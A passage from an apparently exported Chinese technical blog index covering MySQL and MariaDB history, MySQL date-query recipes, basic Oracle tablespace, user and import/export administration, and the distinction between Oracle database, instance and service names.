AB公司。在2008年1月16号被Sun公司收购，后Sun公司又被Oracle公司收购。目前MySQL被广泛地应用在Internet上的大中小型网站中。由于其体积小、速度快、总体拥有成本低，尤其是开放源码这一特点，许多大中小型网站为了降低网站总体拥有成本而选择了MySQL。作为网站数据库，甚至国内知名的淘宝网也选择弃用Oracle而更换为更开放的MySQL。</p><p>MySQL数据库主要应用范围:互联网领域，大中小型网站，游戏公司，电商平台等等。</p><h2 id="1-3-3-MariaDB数据库"><a href="#1-3-3-MariaDB数据库" class="headerlink" title="1.3.3 MariaDB数据库"></a>1.3.3 MariaDB数据库</h2><p>MariaDB数据库管理系统是MySQL数据库的一个分支，主要由开源社区维护，采用GPL授权许可。开发这个MariaDB数据库分支的可能原因之一是:甲骨文公司收购了MySQL后，有将MySQL闭源的潜在风险，因此MySQL开源社区采用分支的方式来避开这个风险。</p><p>开发MariaDB数据库的目的是完全兼容MySQL数据库，包括API和命令行，使之能轻松的成为MySQL的代替品。在存储引擎方面，使用XtraDB(英语: XtraDB)来代替MySQL的InnoDB。MariaDB由MySQL的创始人Michael Widenius(英语:Michael Widenius)主导开发，他早前曾以10亿美元的价格，将自己创建的公司MySQL AB卖给了SUN，此后，随着SUN被甲骨文收购，MySQL的所有权也落入Oracle的手中。MariaDB数据库的名称来自于MySQL的创始人Michael Widenius的女儿Maria的名字。</p><p>MariaDB数据库直到5.5版本，均依照MySQL的版本发行。因此，使用MariaDB5.5的人会从MySQL5.5中了解到MariaDB的所有功能。</p><h2 id="1-3-4-SQL-Server数据库"><a href="#1-3-4-SQL-Server数据库" class="headerlink" title="1.3.4 SQL Server数据库"></a>1.3.4 SQL Server数据库</h2><p>Microsoft SQL Server是微软公司开发的大型关系数据库系统。SQL Server的功能比较全面，效率高，可以作为中型企业或单位的数据库平台。SQL Server可以与Windows操作系统紧密集成，不论是应用程序开发速度还是系统事物处理运行速度，都能得到较大提升。对于在Windows平台上开发的各种企业级信息管理系统来说，不论是C/S(客户机/服务器)架构还是B/S(浏览器/服务器)架构，SQL Server都是一个很好的选择。SQL Server的缺点是只能在WIndows系统下运行。</p><p>1987年，微软和IBM合作开发完成OS/2，IBM在其销售的OS/2 ExtendedEdition系统中绑定了OS/2 Database Manager，而微软产品线中尚缺少数据库产品。为此，微软将目光投向了Sybase，同Sybase签订了合作协议，使用Sybase的技术开发基于OS/2平台的关系型数据库。1989年，微软发布了SQL Server1.0版本。 Microsoft在于Sybase分道扬镳后，随后在其6.05和7.0版本中重写了核心数据库系统，如今SQL Server2008即将到来。</p><p>主要应用范围:部分企业电商(央视购物),使用windows服务器平台的企业。</p><p>1.3.5 Access数据库<br>美国Microsoft公司与1994年推出的微机数据库管理系统。它具有界面友好、易学易用、开发简单、接口灵活等特点，是典型的新一代桌面关系数据库管理系统。它结合了Microsoft Jet Database Engine和图形用户界面两项特点，是Microsoft Office的成员之一。</p>]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL对时间常用操作</title>
    <url>/MySQL/f7ceb3c1.html</url>
    <content><![CDATA[<h3 id="mysql-查询当天、本周，本月，上一个月的数据"><a href="#mysql-查询当天、本周，本月，上一个月的数据" class="headerlink" title="mysql 查询当天、本周，本月，上一个月的数据"></a>mysql 查询当天、本周，本月，上一个月的数据</h3><p>今天<br>select * from 表名 where to_days(时间字段名) = to_days(now());</p><p>昨天<br>SELECT * FROM 表名 WHERE TO_DAYS( NOW( ) ) - TO_DAYS( 时间字段名) &lt;= 1</p><p>近7天<br>SELECT * FROM 表名 where DATE_SUB(CURDATE(), INTERVAL 7 DAY) &lt;= date(时间字段名)</p><p>近30天<br>SELECT * FROM 表名 where DATE_SUB(CURDATE(), INTERVAL 30 DAY) &lt;= date(时间字段名)</p><p>本月<br>SELECT * FROM 表名 WHERE DATE_FORMAT( 时间字段名, ‘%Y%m’ ) = DATE_FORMAT( CURDATE( ) , ‘%Y%m’ )</p><p>上一月<br>SELECT * FROM 表名 WHERE PERIOD_DIFF( date_format( now( ) , ‘%Y%m’ ) , date_format( 时间字段名, ‘%Y%m’ ) ) =1</p><p>查询本季度数据<br>select * from <code>ht_invoice_information</code> where QUARTER(create_date)=QUARTER(now());</p><p>查询上季度数据<br>select * from <code>ht_invoice_information</code> where QUARTER(create_date)=QUARTER(DATE_SUB(now(),interval 1 QUARTER));</p><p>查询本年数据<br>select * from <code>ht_invoice_information</code> where YEAR(create_date)=YEAR(NOW());</p><p>查询上年数据<br>select * from <code>ht_invoice_information</code> where year(create_date)=year(date_sub(now(),interval 1 year));</p><p>查询当前这周的数据<br>SELECT name,submittime FROM enterprise WHERE YEARWEEK(date_format(submittime,’%Y-%m-%d’)) = YEARWEEK(now());</p><p>查询上周的数据<br>SELECT name,submittime FROM enterprise WHERE YEARWEEK(date_format(submittime,’%Y-%m-%d’)) = YEARWEEK(now())-1;</p><p>查询上个月的数据<br>select name,submittime from enterprise where date_format(submittime,’%Y-%m’)=date_format(DATE_SUB(curdate(), INTERVAL 1 MONTH),’%Y-%m’)</p><p>select * from user where DATE_FORMAT(pudate,’%Y%m’) = DATE_FORMAT(CURDATE(),’%Y%m’) ;</p><p>select * from user where WEEKOFYEAR(FROM_UNIXTIME(pudate,’%y-%m-%d’)) = WEEKOFYEAR(now())</p><p>select * from user where MONTH(FROM_UNIXTIME(pudate,’%y-%m-%d’)) = MONTH(now())</p><p>select * from user where YEAR(FROM_UNIXTIME(pudate,’%y-%m-%d’)) = YEAR(now()) and MONTH(FROM_UNIXTIME(pudate,’%y-%m-%d’)) = MONTH(now())</p><p>select * from user where pudate between 上月最后一天 and 下月第一天</p><p>查询当前月份的数据<br>select name,submittime from enterprise where date_format(submittime,’%Y-%m’)=date_format(now(),’%Y-%m’)</p><p>查询距离当前现在6个月的数据<br>select name,submittime from enterprise where submittime between date_sub(now(),interval 6 month) and now();</p><p>查询当前年月日，时分秒<br>select now();</p><p>查询当前年<br>select year(now());</p><p>查询当前月份<br>select month(now());</p><p>查询当前日<br>select day(now());</p><p>查询当前时<br>select Hour(now());</p><p>如下:<br>set @dt = ‘2008-09-10 07:15:30.123456’;</p><p>select date(@dt); – 2008-09-10<br>select time(@dt); – 07:15:30.123456<br>select year(@dt); – 2008<br>select quarter(@dt); – 3<br>select month(@dt); – 9<br>select week(@dt); – 36<br>select day(@dt); – 10<br>select hour(@dt); – 7<br>select minute(@dt); – 15<br>select second(@dt); – 30<br>select microsecond(@dt); – 123456</p><p>MySQL dayof… 函数：dayofweek(), dayofmonth(), dayofyear()<br>分别返回日期参数，在一周、一月、一年中的位置。<br>set @dt = ‘2008-08-08’;</p><p>select dayofweek(@dt); – 6<br>select dayofmonth(@dt); – 8<br>select dayofyear(@dt); – 221</p><p>MySQL week… 函数：week(), weekofyear(), dayofweek(), weekday(), yearweek()<br>set @dt = ‘2008-08-08’;</p><p>select week(@dt); – 31<br>select week(@dt,3); – 32<br>select weekofyear(@dt); – 32</p><p>select dayofweek(@dt); – 6<br>select weekday(@dt); – 4</p><p>select yearweek(@dt); – 200831</p><p>MySQL 返回星期和月份名称函数：dayname(), monthname()<br>set @dt = ‘2008-08-08’;</p><p>select dayname(@dt); – Friday<br>select monthname(@dt); – August</p><p>MySQL last_day() 函数：返回月份中的最后一天。<br>select last_day(‘2008-02-01’); – 2008-02-29<br>select last_day(‘2008-08-08’); – 2008-08-31</p><p>MySQL 日期时间计算函数<br>MySQL 为日期增加一个时间间隔：date_add()<br>set @dt = now();</p><p>select date_add(@dt, interval 1 day); – add 1 day<br>select date_add(@dt, interval 1 hour); – add 1 hour<br>select date_add(@dt, interval 1 minute); – …<br>select date_add(@dt, interval 1 second);<br>select date_add(@dt, interval 1 microsecond);<br>select date_add(@dt, interval 1 week);<br>select date_add(@dt, interval 1 month);<br>select date_add(@dt, interval 1 quarter);<br>select date_add(@dt, interval 1 year);select date_add(@dt, interval -1 day); – sub 1 day</p><p>MySQL查询一个月天数<br>select (curdate()-interval day(curdate()) day) + interval s day as dt<br>from (<br>select 1 as s<br>union all<br>select 2<br>union all<br>select 3<br>union all<br>select 4<br>union all<br>select 5<br>union all<br>select 6<br>union all<br>select 7<br>union all<br>select 8<br>union all<br>select 9<br>union all<br>select 10<br>union all<br>select 11<br>union all<br>select 12<br>union all<br>select 13<br>union all<br>select 14<br>union all<br>select 15<br>union all<br>select 16<br>union all<br>select 17<br>union all<br>select 18<br>union all<br>select 19<br>union all<br>select 20<br>union all<br>select 21<br>union all<br>select 22<br>union all<br>select 23<br>union all<br>select 24<br>union all<br>select 25<br>union all<br>select 26<br>union all<br>select 27<br>union all<br>select 28<br>union all<br>select 29<br>union all<br>select 30<br>union all<br>select 31<br>) m<br>where s&lt;=day(LAST_DAY(CURDATE()));</p><p>MySQL查询当月天数<br>select m.s as day<br>from (<br>select 1 as s<br>union all<br>select 2<br>union all<br>select 3<br>union all<br>select 4<br>union all<br>select 5<br>union all<br>select 6<br>union all<br>select 7<br>union all<br>select 8<br>union all<br>select 9<br>union all<br>select 10<br>union all<br>select 11<br>union all<br>select 12<br>union all<br>select 13<br>union all<br>select 14<br>union all<br>select 15<br>union all<br>select 16<br>union all<br>select 17<br>union all<br>select 18<br>union all<br>select 19<br>union all<br>select 20<br>union all<br>select 21<br>union all<br>select 22<br>union all<br>select 23<br>union all<br>select 24<br>union all<br>select 25<br>union all<br>select 26<br>union all<br>select 27<br>union all<br>select 28<br>union all<br>select 29<br>union all<br>select 30<br>union all<br>select 31<br>) m<br>where s&lt;=day(LAST_DAY(CURDATE()));</p><p>一些用法如下:<br>mysql&gt; select DATE_FORMAT(CURDATE(), ‘%Y%m’);<br>+——————————–+<br>| DATE_FORMAT(CURDATE(), ‘%Y%m’) |<br>+——————————–+<br>| 201803 |<br>+——————————–+<br>1 row in set (0.00 sec)</p><p>mysql&gt; select DATE_SUB(‘2017-04-01’,INTERVAL 1 MONTH)<br>-&gt; ;<br>+—————————————–+<br>| DATE_SUB(‘2017-04-01’,INTERVAL 1 MONTH) |<br>+—————————————–+<br>| 2017-03-01 |<br>+—————————————–+<br>1 row in set (0.05 sec)</p><p>mysql&gt; select DATE_SUB(‘2017-04-01’,INTERVAL 1 YEAR);<br>+—————————————-+<br>| DATE_SUB(‘2017-04-01’,INTERVAL 1 YEAR) |<br>+—————————————-+<br>| 2016-04-01 |<br>+—————————————-+<br>1 row in set (0.00 sec)</p><p>mysql&gt; select DATE_SUB(NOW(),INTERVAL 1 YEAR);<br>+———————————+<br>| DATE_SUB(NOW(),INTERVAL 1 YEAR) |<br>+———————————+<br>| 2017-03-27 09:20:22 |<br>+———————————+<br>1 row in set (0.00 sec)</p><p>mysql&gt; select DATE_SUB(NOW(),INTERVAL 1 YEAR);<br>+———————————+<br>| DATE_SUB(NOW(),INTERVAL 1 YEAR) |<br>+———————————+<br>| 2017-03-27 09:21:42 |<br>+———————————+<br>1 row in set (0.00 sec)</p><p>mysql&gt;</p><p>mysql&gt; select ( DATE_FORMAT(now(), ‘%Y%m’)-1);<br>+———————————+<br>| ( DATE_FORMAT(now(), ‘%Y%m’)-1) |<br>+———————————+<br>| 201802 |<br>+———————————+<br>1 row in set (0.07 sec)</p><p>mysql&gt; select ( DATE_FORMAT(now(), ‘%m’)-1);<br>+——————————-+<br>| ( DATE_FORMAT(now(), ‘%m’)-1) |<br>+——————————-+<br>| 2 |<br>+——————————-+<br>1 row in set (0.00 sec)</p><p>mysql&gt; select DATE_FORMAT(CURDATE(), ‘%Y%m’);<br>+——————————–+<br>| DATE_FORMAT(CURDATE(), ‘%Y%m’) |<br>+——————————–+<br>| 201803 |<br>+——————————–+<br>1 row in set (0.08 sec)</p><p>mysql&gt; select YEAR(DATE_SUB(NOW(),INTERVAL 1 YEAR));<br>+—————————————+<br>| YEAR(DATE_SUB(NOW(),INTERVAL 1 YEAR)) |<br>+—————————————+<br>| 2017 |<br>+—————————————+<br>1 row in set (0.06 sec)</p><p>mysql&gt; select DATE_FORMAT(now(), ‘%Y%m’);<br>+—————————-+<br>| DATE_FORMAT(now(), ‘%Y%m’) |<br>+—————————-+<br>| 201803 |<br>+—————————-+<br>1 row in set (0.27 sec)</p><p>mysql&gt; select DATE_FORMAT(now(), ‘%m’);<br>+————————–+<br>| DATE_FORMAT(now(), ‘%m’) |<br>+————————–+<br>| 03 |<br>+————————–+<br>1 row in set (0.00 sec)</p><p>以下展示两个例子，按月统计和按日统计:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">"year"</span>.equals(type)) &#123;</span><br><span class="line">			<span class="comment">// 年走势，按月查</span></span><br><span class="line">			unit = <span class="string">"月"</span>;</span><br><span class="line">			title = TimeUtil.getCurrentYear() +<span class="string">"问题缺陷走势"</span>;</span><br><span class="line">			sql = <span class="string">"select distinct a. month as name, ifnull(b.count, 0) as count from ( select 1 as month union select 2 as month union select 3 as month union select 4 as month union select 5 as month union select 6 as month union select 7 as month union select 8 as month union select 9 as month union select 10 as month union select 11 as month union select 12 as month ) as a left join ( select month (fd_jlsj) as month, count(pk_qxyhjl) as count from t_sb_qxyhjl where year (fd_jlsj) = year (now()) and pub_jlzt &lt;&gt; '草拟' group by month (fd_jlsj)) as b on a. month = b. month"</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">"month"</span>.equals(type)) &#123;</span><br><span class="line">			<span class="comment">// 月走势，按日查</span></span><br><span class="line">			unit = <span class="string">"日"</span>;</span><br><span class="line">			title = TimeUtil.getCurrentYearMonth() +<span class="string">"问题缺陷走势"</span>;</span><br><span class="line">			sql = <span class="string">"select distinct a. day as name, ifnull(b.count, 0) as count from ( select m.s as day from ( select 1 as s union all select 2 union all select 3 union all select 4 union all select 5 union all select 6 union all select 7 union all select 8 union all select 9 union all select 10 union all select 11 union all select 12 union all select 13 union all select 14 union all select 15 union all select 16 union all select 17 union all select 18 union all select 19 union all select 20 union all select 21 union all select 22 union all select 23 union all select 24 union all select 25 union all select 26 union all select 27 union all select 28 union all select 29 union all select 30 union all select 31 ) m where s &lt;= day (last_day(curdate()))) as a left join ( select day (fd_jlsj) as day, count(pk_qxyhjl) count from t_sb_qxyhjl where date_format(now(), '%Y-%m') = date_format(fd_jlsj, '%Y-%m') and pub_jlzt &lt;&gt; '草拟' group by day (fd_jlsj)) as b on a. day = b. day"</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure><p>MySQL修改字段：<br>t_table 表示:表名<br>t_filed 表示:字段</p><p>添加字段<br>alter table t_table add column t_filed int(11) DEFAULT NULL COMMENT ‘是否是名家:0:否，1是’;</p>]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle常用基本操作</title>
    <url>/Oracle/a08da4e8.html</url>
    <content><![CDATA[<h2 id="oracle数据库常用基本操作"><a href="#oracle数据库常用基本操作" class="headerlink" title="oracle数据库常用基本操作"></a>oracle数据库常用基本操作</h2><p>–查看数据库名</p><blockquote><p>select name from v$database;</p></blockquote><p>–查看数据库实例名</p><blockquote><p>select instance_name from v$instance;</p></blockquote><blockquote><p>show parameter instance;<br>–查看当前登录用户默认表空间，临时表空间</p></blockquote><blockquote><p>select username,default_tablespace,temporary_tablespace from user_users;<br>–查看用户和默认表空间的关系</p></blockquote><blockquote><p>select username,default_tablespace from dba_users;<br>–查看当前用户能访问的表</p></blockquote><blockquote><p>select * from user_tables;<br>–Oracle查询用户表</p></blockquote><blockquote><p>select * from user_all_tables;</p></blockquote><p>–Oracle查询用户视图</p><blockquote><p>select * from user_views;</p></blockquote><p>–查询所有函数和储存过程：</p><blockquote><p>select * from user_source;</p></blockquote><p>–查询所有用户：</p><blockquote><p>select * from all_users;<br>select * from dba_users</p></blockquote><p>–查看当前用户连接：</p><blockquote><p>select * from v$Session;</p></blockquote><p>–查看用户角色</p><blockquote><p>SELECT * FROM USER_ROLE_PRIVS;</p></blockquote><p>–查看当前用户权限：</p><blockquote><p>select * from session_privs;</p></blockquote><p>–查看所有用户所拥有的角色</p><blockquote><p>SELECT * FROM DBA_ROLE_PRIVS;</p></blockquote><p>–查看所有角色</p><blockquote><p>select * from dba_roles;</p></blockquote><p>–查看数据库名</p><blockquote><p>SELECT NAME FROM V$DATABASE;</p></blockquote><p>–查看所有表空间使用情况</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> a.file_id <span class="string">"FileNo"</span>,</span><br><span class="line">       a.tablespace_name <span class="string">"Tablespace_name"</span>,</span><br><span class="line">       a.bytes <span class="string">"Bytes"</span>,</span><br><span class="line">       a.bytes - <span class="keyword">sum</span>(nvl(b.bytes, <span class="number">0</span>)) <span class="string">"Used"</span>,</span><br><span class="line">       <span class="keyword">sum</span>(nvl(b.bytes, <span class="number">0</span>)) <span class="string">"Free"</span>,</span><br><span class="line">       <span class="keyword">sum</span>(nvl(b.bytes, <span class="number">0</span>)) / a.bytes * <span class="number">100</span> <span class="string">"%free"</span></span><br><span class="line">  <span class="keyword">from</span> dba_data_files a, dba_free_space b</span><br><span class="line"> <span class="keyword">where</span> a.file_id = b.file_id(+)</span><br><span class="line"> <span class="keyword">group</span> <span class="keyword">by</span> a.tablespace_name, a.file_id, a.bytes</span><br><span class="line"> <span class="keyword">order</span> <span class="keyword">by</span> a.tablespace_name;</span><br></pre></td></tr></table></figure><h2 id="创建表空间"><a href="#创建表空间" class="headerlink" title="创建表空间"></a>创建表空间</h2><p>在plsql工具中执行以下语句，可建立Oracle表空间。分为四步：</p><h3 id="第1步：创建临时表空间"><a href="#第1步：创建临时表空间" class="headerlink" title="第1步：创建临时表空间"></a>第1步：创建临时表空间</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">temporary</span> <span class="keyword">tablespace</span> test_temp </span><br><span class="line">tempfile <span class="string">'F:\DataBase\test\test_temp.dbf'</span> </span><br><span class="line"><span class="keyword">size</span> <span class="number">50</span>m  </span><br><span class="line"><span class="keyword">autoextend</span> <span class="keyword">on</span>  </span><br><span class="line"><span class="keyword">next</span> <span class="number">50</span>m <span class="keyword">maxsize</span> <span class="number">20480</span>m  </span><br><span class="line"><span class="keyword">extent</span> <span class="keyword">management</span> <span class="keyword">local</span>;</span><br></pre></td></tr></table></figure><h3 id="第2步：创建数据表空间"><a href="#第2步：创建数据表空间" class="headerlink" title="第2步：创建数据表空间"></a>第2步：创建数据表空间</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">tablespace</span> test_data  </span><br><span class="line"><span class="keyword">logging</span>  </span><br><span class="line"><span class="keyword">datafile</span> <span class="string">'F:\DataBase\test\test_data.dbf'</span> </span><br><span class="line"><span class="keyword">size</span> <span class="number">50</span>m  </span><br><span class="line"><span class="keyword">autoextend</span> <span class="keyword">on</span>  </span><br><span class="line"><span class="keyword">next</span> <span class="number">50</span>m <span class="keyword">maxsize</span> <span class="number">20480</span>m  </span><br><span class="line"><span class="keyword">extent</span> <span class="keyword">management</span> <span class="keyword">local</span>;</span><br><span class="line">```  </span><br><span class="line"> </span><br><span class="line"><span class="comment">### 第3步：创建用户并指定表空间</span></span><br><span class="line">```SQL</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> <span class="keyword">test</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="number">123</span>  </span><br><span class="line"><span class="keyword">default</span> <span class="keyword">tablespace</span> test_data  </span><br><span class="line"><span class="keyword">temporary</span> <span class="keyword">tablespace</span> test_temp;</span><br></pre></td></tr></table></figure><h3 id="第4步：给用户授予权限"><a href="#第4步：给用户授予权限" class="headerlink" title="第4步：给用户授予权限"></a>第4步：给用户授予权限</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">connect</span>,<span class="keyword">resource</span> <span class="keyword">to</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure><p>注:oracle12c 创建用户时必须以c##开头，否则报错</p><p>如果删除用户使用drop即可，如果要删除表空间的同时，删除对应的文件可以这样</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> username <span class="keyword">cascade</span> ;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">tablespace</span> caifenglin_data <span class="keyword">including</span> <span class="keyword">contents</span> <span class="keyword">and</span> <span class="keyword">datafiles</span> <span class="keyword">cascade</span> <span class="keyword">constraints</span> ;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">tablespace</span> caifenglin_temp <span class="keyword">including</span> <span class="keyword">contents</span> <span class="keyword">and</span> <span class="keyword">datafiles</span> <span class="keyword">cascade</span> <span class="keyword">constraints</span> ;</span><br></pre></td></tr></table></figure><p>导入导出命令</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">expdp system/ <span class="attribute">directory</span>=EXPDIR <span class="attribute">dumpfile</span>=river_base_20161108.dmp <span class="attribute">SCHEMAS</span>=c##GD_RIVER_UAT,c##GD_PROCESS_UAT</span><br><span class="line"></span><br><span class="line">imp system/yjs123 <span class="attribute">file</span>=<span class="string">'C:\Users\admin\Desktop\20130401\Bao\backup\2013-04-01_morning.dmp'</span> <span class="attribute">tablespaces</span>=test_data <span class="attribute">full</span>=y <span class="attribute">ignore</span>=y</span><br></pre></td></tr></table></figure><p>Oracle_创建用户_授予权限</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--创建用户,需要足够的权限  create</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> hzf <span class="keyword">identified</span> <span class="keyword">by</span> hzf;  </span><br><span class="line"></span><br><span class="line"><span class="comment">--给用户bjsxt分配权限  grant</span></span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">connect</span>,<span class="keyword">resource</span> <span class="keyword">to</span> hzf;</span><br><span class="line"><span class="keyword">grant</span> dba <span class="keyword">to</span> hzf;</span><br><span class="line"></span><br><span class="line"><span class="comment">--撤销权限 revoke</span></span><br><span class="line"><span class="keyword">revoke</span> <span class="keyword">connect</span>,<span class="keyword">resource</span> <span class="keyword">from</span> hzf; </span><br><span class="line"></span><br><span class="line"><span class="comment">--删除用户</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> hzf;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle实例名和服务名以及数据库名区别</title>
    <url>/Oracle/1b25f37f.html</url>
    <content><![CDATA[<h2 id="一、数据库名"><a href="#一、数据库名" class="headerlink" title="一、数据库名"></a>一、数据库名</h2><h3 id="什么是数据库名？"><a href="#什么是数据库名？" class="headerlink" title="什么是数据库名？"></a>什么是数据库名？</h3><p>数据库名就是一个数据库的标识，就像人的身份证号一样。他用参数DB_NAME表示，如果一台机器上装了多全数据库，那么每一个数据库都有一个数据库名。在数据库安装或创建完成之后，参数DB_NAME被写入参数文件之中。格式如下：<br>DB_NAME=myorcl<br>…<br>在创建数据库时就应考虑好数据库名，并且在创建完数据库之后，数据库名不宜修改，即使要修改也会很麻烦。因为，数据库名还被写入控制文件中，控制文件是以二 进制形式存储的，用户无法修改控制文件的内容。假设用户修改了参数文件中的数据库名，即修改DB_NAME的值。但是在Oracle启动时，由于参数文件 中的DB_NAME与控制文件中的数据库名不一致，导致数据库启动失败，将返回ORA-01103错误。</p><p>DB_NAME和instance_name在\oracle\admin\szcg\pfile\下的init.ora文件中，其中szcg是数据库名</p><h3 id="数据库名的作用"><a href="#数据库名的作用" class="headerlink" title="数据库名的作用"></a>数据库名的作用</h3><p>数据库名是在安装数据库、创建新的数据库、创建数据库控制文件、修改数据结构、备份与恢复数据库时都需要使用到的。<br>有很多Oracle安装文件目录是与数据库名相关的，如：<br>winnt: d:\oracle\product\10.1.0\oradata\DB_NAME...<br>Unix: /home/app/oracle/product/10.1.0/oradata/DB_NAME/…<br>pfile:<br>winnt: d:\oracle\product\10.1.0\admin\DB_NAME\pfile\ini.ora<br>Unix: /home/app/oracle/product/10.1.0/admin/DB_NAME/pfile/init$ORACLE_SID.ora<br>跟踪文件目录：<br>winnt: /home/app/oracle/product/10.1.0/admin/DB_NAME/bdump/…<br>另外，在创建数据时，careate database命令中的数据库名也要与参数文件中DB_NAME参数的值一致，否则将产生错误。同样，修改数据库结构的语句alter database，当然也要指出要修改的数据库的名称。<br>如果控制文件损坏或丢失，数据库将不能加载，这时要重新创建控制文件，方法是以nomount方式启动实例，然后以create controlfile命令创建控制文件，当然这个命令中也是指指DB_NAME。还有在备份或恢复数据库时，都需要用到数据库名。总之，数据库名很重要，要准确理解它的作用</p><h3 id="查询当前数据名"><a href="#查询当前数据名" class="headerlink" title="查询当前数据名"></a>查询当前数据名</h3><p>方法一:select name from v$database;<br>方法二：show parameter db<br>方法三：查看参数文件。</p><p>select global_name from global_name;</p><h3 id="修改数据库名"><a href="#修改数据库名" class="headerlink" title="修改数据库名"></a>修改数据库名</h3><p>前面建议：应在创建数据库时就确定好数据库名，数据库名不应作修改，因为修改数据库名是一件比较复杂的事情。那么现在就来说明一下，如何在已创建数据之后，修改数据库名。步骤如下：<br>1.关闭数据库。<br>2.修改数据库参数文件中的DB_NAME参数的值为新的数据库名。<br>3.以NOMOUNT方式启动实例，修建控制文件(有关创建控制文件的命令语法，请参考oracle文档)</p><h2 id="二、数据库实例名"><a href="#二、数据库实例名" class="headerlink" title="二、数据库实例名"></a>二、数据库实例名</h2><h3 id="什么是数据库实例名？"><a href="#什么是数据库实例名？" class="headerlink" title="什么是数据库实例名？"></a>什么是数据库实例名？</h3><p>数据库实例名是用于和操作系统进行联系的标识，就是说数据库和操作系统之间的交互用的是数据库实例名。实例名也被写入参数文件中，该参数为instance_name，在winnt平台中，实例名同时也被写入注册表。数据库名和实例名可以相同也可以不同。在一般情况下，数据库名和实例名是一对一的关系，但如果在oracle并行服务器架构(即oracle实时应用集群)中，数据库名和实例名是一对多的关系。这一点在第一篇中已有图例说明。</p><h3 id="查询当前数据库实例名"><a href="#查询当前数据库实例名" class="headerlink" title="查询当前数据库实例名"></a>查询当前数据库实例名</h3><p>方法一：select instance_name from v$instance;<br>方法二：show parameter instance<br>方法三：在参数文件中查询。</p><p>Unix下可以这样看：<br>$ ps -ef|grep ora_<br>进程的最后几个字母就是sid</p><p>在oracle的安装目录下,如D:/oracle/product/10.2.0/db_1/dbs,看文件名如SPFILEORCL.ORA,那么就是orcl,也就是说文件名字是 “SPFILE<strong>**</strong>.ORA “,那种的 “**** “就是SID D:/oracle/product/10.2.0/oradata/SID文件夹… 或D:/oracle/product/10.2.0/db_1/dbs/SPFILESID名称.ORA</p><h3 id="数据库实例名与ORACLE-SID"><a href="#数据库实例名与ORACLE-SID" class="headerlink" title="数据库实例名与ORACLE_SID"></a>数据库实例名与ORACLE_SID</h3><p>虽然两者都表是oracle实例，但两者是有区别的。instance_name是oracle数据库参数。而ORACLE_SID是操作系统的环境变量。 ORACLD_SID用于与操作系统交互，也就是说，从操作系统的角度访问实例名，必须通过ORACLE_SID。在winnt不 台，ORACLE_SID还需存在于注册表中。且ORACLE_SID必须与instance_name的值一致，否则，你将会收到一个错误，在unix平台，是“ORACLE not available”,在winnt平台，是“TNS:协议适配器错误”。</p><h3 id="数据库实例名与网络连接"><a href="#数据库实例名与网络连接" class="headerlink" title="数据库实例名与网络连接"></a>数据库实例名与网络连接</h3><p>数据库实例名除了与操作系统交互外，还用于网络连接的oracle服务器标识。当你配置oracle主机连接串的时候，就需要指定实例名。当然8i以后版本的网络组件要求使用的是服务名SERVICE_NAME。这个概念接下来说明。</p><h2 id="三、数据库域名"><a href="#三、数据库域名" class="headerlink" title="三、数据库域名"></a>三、数据库域名</h2><h3 id="什么是数据库域名？"><a href="#什么是数据库域名？" class="headerlink" title="什么是数据库域名？"></a>什么是数据库域名？</h3><p>在分布式数据库系统中，不同版本的数据库服务器之间，不论运行的操作系统是unix或是windows，各服务器之间都可以通过数据库链路进行远程复制，数据库域名主要用于oracle分布式环境中的复制。举例说明如：<br>全国交通运政系统的分布式数据库，其中：<br>福建节点： fj.jtyz<br>福建厦门节点： xm.fj.jtyz<br>江西： jx.jtyz<br>江西上饶：sr.jx.jtyz<br>这就是数据库域名。<br>数据库域名在存在于参数文件中，他的参数是db_domain.</p><h3 id="查询数据库域名"><a href="#查询数据库域名" class="headerlink" title="查询数据库域名"></a>查询数据库域名</h3><p>方法一：select * from v$parameter where name = ‘db_domain’;<br>方法二：show parameter domain<br>方法三：在参数文件中查询。</p><h3 id="全局数据库名"><a href="#全局数据库名" class="headerlink" title="全局数据库名"></a>全局数据库名</h3><p>全局数据库名=数据库名+数据库域名，如前述福建节点的全局数据库名是：oradb.fj.jtyz</p><h2 id="四、数据库服务名"><a href="#四、数据库服务名" class="headerlink" title="四、数据库服务名"></a>四、数据库服务名</h2><h3 id="什么是数据库服务名？"><a href="#什么是数据库服务名？" class="headerlink" title="什么是数据库服务名？"></a>什么是数据库服务名？</h3><p>从oracle9i版本开始，引入了一个新的参数，即数据库服务名。参数名是SERVICE_NAME。<br>如果数据库有域名，则数据库服务名就是全局数据库名；否则，数据库服务名与数据库名相同。</p><h3 id="查询数据库服务名"><a href="#查询数据库服务名" class="headerlink" title="查询数据库服务名"></a>查询数据库服务名</h3><p>方法一：show parameter service_name<br>方法二：在参数文件中查询（查数据库名）。</p><h3 id="数据库服务名与网络连接"><a href="#数据库服务名与网络连接" class="headerlink" 